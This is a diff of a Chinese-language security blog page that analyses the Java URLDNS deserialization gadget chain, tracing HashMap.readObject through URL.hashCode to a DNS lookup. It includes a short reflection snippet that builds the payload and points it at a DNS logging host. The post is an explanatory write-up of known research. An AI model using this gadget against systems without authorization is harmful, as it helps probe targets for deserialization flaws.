@@ -10,7 +10,7 @@
   
   <title>
     
-      Wileysec&#39;s Blog
+      URLDNS利用链分析 | Wileysec&#39;s Blog
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -149,43 +149,40 @@
   </div>
 </header>
     <div id="article-banner">
-  <h2></h2>
+  <h2>URLDNS利用链分析</h2>
   <p class="post-date">2022-06-22</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
   </div>
 </div>
-<input type="hidden" value="http://example.com/default/c180fda4a6eb.html">
+<input type="hidden" value="http://example.com/Java%E5%AE%89%E5%85%A8/c180fda4a6eb.html">
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><center><h1>URLDNS利用链</h1></center>
-
-<p>[TOC]</p>
-<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><blockquote>
+    <section class="markdown-content"><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><blockquote>
 <p>  URLDNS利用链如下：</p>
 <p>  <code>HashMap.readObject()</code> -&gt;  <code>HashMap.putVal()</code> -&gt; <code>HashMap.hash()</code> -&gt; <code>URL.hashCode()</code>  -&gt; <code>URLStreamHandler.hashCode()</code> -&gt; <code>URL.getHostAddress()</code> -&gt; <code>URL.getByName()</code></p>
 </blockquote>
 <h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>Java中Map集合有Key和Value，可以接受任何数据类型的数据。入口类的参数是可控的并且可以是任意类或对象。</p>
 <p>其中HashMap是Map接口的实现类，它继承了Serializable，HashMap是可被序列化的。</p>
 <p>在HashMap重写了 <code>readyObject</code> 方法</p>
-<p><img src="/default/c180fda4a6eb/image-20220711162017337.png" alt="image-20220711162017337"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711162017337.png" alt="image-20220711162017337"></p>
 <p>在 <code>readObject </code> 方法中调用了 <code>putVal</code> 方法，在 <code>putVal</code> 方法中调用了 <code>hash</code> 方法</p>
-<p><img src="/default/c180fda4a6eb/image-20220711161848032.png" alt="image-20220711161848032"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711161848032.png" alt="image-20220711161848032"></p>
 <p>继续跟进，调用了 <code>hash</code> 方法中的 <code>key</code> 参数对象的 <code>hashCode</code> 方法</p>
-<p><img src="/default/c180fda4a6eb/image-20220711162242167.png" alt="image-20220711162242167"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711162242167.png" alt="image-20220711162242167"></p>
 <p>这里，参数是哪个对象就会调用哪个对象的 <code>hashCode</code> 方法</p>
 <p>Java中的 <code>URL</code> 类，重写了 <code>hashCode</code> 方法并且可以DNS请求</p>
 <p>找到 <code>URL</code> 类，重写了 <code>hashCode</code> 方法</p>
-<p><img src="/default/c180fda4a6eb/image-20220711162803370.png" alt="image-20220711162803370"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711162803370.png" alt="image-20220711162803370"></p>
 <p>这里的逻辑是，当 <code>hashCode</code> 变量为 <code>-1</code> 时才会执行到 <code>handler.hashCode()</code> 方法</p>
 <p><code>handler</code> 变量是 <code>URLStreamHandler</code> 类</p>
-<p><img src="/default/c180fda4a6eb/image-20220711163040088.png" alt="image-20220711163040088"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711163040088.png" alt="image-20220711163040088"></p>
 <p>找到 <code>URLStreamHandler</code> 类中的 <code>hashCode</code> 方法</p>
 <p>调用了 <code>getHostAddress</code> 方法</p>
-<p><img src="/default/c180fda4a6eb/image-20220711163418611.png" alt="image-20220711163418611"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711163418611.png" alt="image-20220711163418611"></p>
 <p>再继续跟进，<code>getByName</code> 方法可以发起DNS请求</p>
-<p><img src="/default/c180fda4a6eb/image-20220711164436126.png" alt="image-20220711164436126"></p>
+<p><img src="/Java%E5%AE%89%E5%85%A8/c180fda4a6eb/image-20220711164436126.png" alt="image-20220711164436126"></p>
 <p>到这里，我们就理清楚URLDNS链的整个过程了。</p>
 <h2 id="利用链利用"><a href="#利用链利用" class="headerlink" title="利用链利用"></a>利用链利用</h2><p>在上面，我们说到 <code>hashCode</code> 变量为 <code>-1</code> 是才会执行 <code>handler.hashCode()</code> 方法，该变量默认为 <code>-1</code>，那么在利用时就会出现一个问题，在执行 <code>HashMap.put</code> 方法时就会进行一次请求，无法确认是在反序列化时进行的DNS请求还是在序列化HashMap类时，HashMap的put方法导致的DNS请求。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://168dc12f.dns.1433.eu.org&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 先设置</span></span><br><span class="line">hashCode.set(url,<span class="number">123</span>);</span><br><span class="line">hashMap.put(url,<span class="number">122</span>);</span><br><span class="line">hashCode.set(url,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
@@ -198,6 +195,19 @@
 <p>当程序接受一个序列化对象文件并反序列化操作时就读取了序列化的 <code>HashMap</code> 对象，此时 <code>HashMap</code> 的 <code>hashCode</code> 值为 <code>-1</code> ，即可进行DNS查询。</p>
 </section>
     <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Java安全" >
+    <span class="tag-code">Java安全</span>
+  </a>
+
+  <a href="/tags#URLDNS" >
+    <span class="tag-code">URLDNS</span>
+  </a>
+
+      </div>
     
     <!-- Tags END -->
     <!-- NAV START -->
@@ -235,7 +245,7 @@
   <div class="toc-main">
     <strong class="toc-title">TOC</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-text">URLDNS利用链</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-nav-text">利用链</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-nav-text">利用链分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-nav-text">利用链利用</span></a></li></ol></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-nav-text">利用链</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-nav-text">利用链分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-nav-text">利用链利用</span></a></li></ol>
     
   </div>
 </aside>
@@ -245,7 +255,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/default/c180fda4a6eb.html';
+    var url = 'http://example.com/Java安全/c180fda4a6eb.html';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
